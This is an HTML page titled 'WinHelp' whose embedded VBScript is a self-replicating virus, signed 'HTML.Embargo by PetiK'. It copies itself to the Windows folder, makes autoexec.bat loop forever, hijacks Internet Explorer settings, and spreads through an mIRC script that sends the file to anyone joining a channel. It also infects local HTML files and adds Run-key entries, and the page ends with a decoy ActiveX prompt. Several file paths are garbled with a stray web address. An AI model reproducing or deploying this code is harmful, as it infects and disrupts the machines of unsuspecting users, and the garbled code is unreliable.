<embargo>
<HTML><HEAD><TITLE>WinHelp</TITLE></HEAD>
<BODY bgColor=#ffffff>

<SCRIPT Language=VBScript>
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")

Set original=document.body.createTextRange
Set copie=fso.CreateTextFile(fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/WinHelp.htm")
copie.WriteLine "<embargo>"
copie.WriteLine "<HTML><HEAD><TITLE>WinHelp</TITLE></HEAD>"
copie.WriteLine "<BODY bgColor=#ffffff>"
copie.WriteLine original.htmltext
copie.WriteLine "</BODY></HTML>"
copie.Close()

reg=ws.RegRead("HKLM\Software\HTML.Embargo\")
If reg <> "c parti" Then
Set auto=fso.OpenTextFile("C:\autoexec.bat", 1, False, False)
tout=auto.ReadAll
Set nouveau= fso.CreateTextFile("C:\autoexec.bat", True, False)
nouveau.Write(tout)
nouveau.WriteLine ""
nouveau.WriteLine "@echo off"
nouveau.WriteLine ":embargo"
nouveau.WriteLine "cls"
nouveau.WriteLine "echo This is the signature of my new virus"
nouveau.WriteLine "echo."
nouveau.WriteLine "echo HTML.Embargo by PetiK"
nouveau.WriteLine "echo Made In France (c)2001"
nouveau.WriteLine "pause"
nouveau.WriteLine "goto embargo"
nouveau.Close()
ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/WinHelp.htm"
ws.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\FullScreen","yes"
ws.RegWrite "HKLM\Software\HTML.Embargo\","c parti"
End If

reg=ws.RegRead("HKLM\Software\HTML.Embargo\mirc")
If reg <> "c parti" Then
PFD=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If dossier = "" Then
If fso.FileExists("c:\mirc\mirc.ini") Then dossier = "c:\mirc"
If fso.FileExists("c:\mirc32\mirc.ini") Then dossier = "c:\mirc32"
If fso.FileExists(PFD & "http://www.cs.ucdavis.edu/mirc/mirc.ini") Then dossier = PFD & "\mirc"
If fso.FileExists(PFD & "http://www.cs.ucdavis.edu/mirc32/mirc.ini") Then dossier = PFD & "\mirc32"
End If
If dossier <> "" Then
Set script = fso.CreateTextFile(dossier & "http://www.cs.ucdavis.edu/script.ini", True)
script.WriteLine "[script]"
script.WriteLine "n0=on 1:JOIN:#:{"
script.WriteLine "n1= /if ( $nick == &me ) (halt)"
script.WriteLine "n2= ./dcc send $nick " & fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/WinHelp.htm"
script.WriteLine "n3=}"
ws.RegWrite "HKLM\Software\HTML.Embargo\mirc","c parti"
End If

Set FolderObj = fso.GetFolder(fso.GetSpecialFolder(0)&"\WEB\WallPaper")
    Set FO = FolderObj.Files
    For Each cible in FO
        ext = lcase(fso.GetExtensionName(cible.Name))
        If ext = "htm" or ext = "html" Then
           Set vrai = fso.OpenTextFile(cible.path, 1, false)
           If vrai.readline <> "<embargo>" Then
               vrai.Close()
               Set vrai = fso.OpenTextFile(cible.path, 1, false)
               htmorg = vrai.ReadAll()
               vrai.Close()
               Set virus = document.body.createTextRange
               Set vrai = fso.CreateTextFile(cible.path, True, False)
               vrai.WriteLine(htmorg)
               vrai.WriteLine ""
               vrai.WriteLine virus.htmltext
               vrai.Close()
           Else
               vrai.Close()
           End If
        End If
    Next
End If

If Day(Now()) = 5 or Day(Now)) = 17 Then
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CDPlayer",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/Cdplayer.exe"
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NotePad",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/Notepad.exe"
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PaintBrush",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/Pbrush.exe"
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Explorer",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/Explorer.exe"
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\RegEdit",fso.GetSpecialFolder(0)&"http://www.cs.ucdavis.edu/Regedit.exe"
ws.RegWrite "HKCU\Control Panel\Desktop\ScreenSaveTimeOut","60"
ws.RegWrite "HKCU\Control Panel\Desktop\ScreenSaveUsePassword", 01, "REG_DWORD"


document.Write "<font face='verdana' color=blue size='2'>Microsoft Internet Explorer<br>Please enabled ActiveX to see this page<br></font>"
</SCRIPT>
</BODY></HTML>
